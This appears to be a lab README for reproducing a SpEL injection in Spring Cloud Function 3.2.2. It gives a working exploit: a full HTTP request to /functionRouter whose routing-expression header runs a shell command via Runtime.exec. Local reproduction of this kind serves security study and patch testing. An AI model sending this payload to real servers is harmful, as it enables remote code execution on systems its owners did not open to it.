## Vulnerability Environment
Execute the following command to start a server that uses Spring Cloud Function 3.2.2:
```

```
After server is started, execute `curl http://your-ip:8080/uppercase -H "Content-Type: text/plain" --data-binary test` you can convert the user input to uppercase.
## Vulnerability Reproduce
There is a SpEL expression injection in the request header `spring.cloud.function.routing-expression`.
Send the following request to execute `touch /tmp/success` on the target server:
```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4
test
```
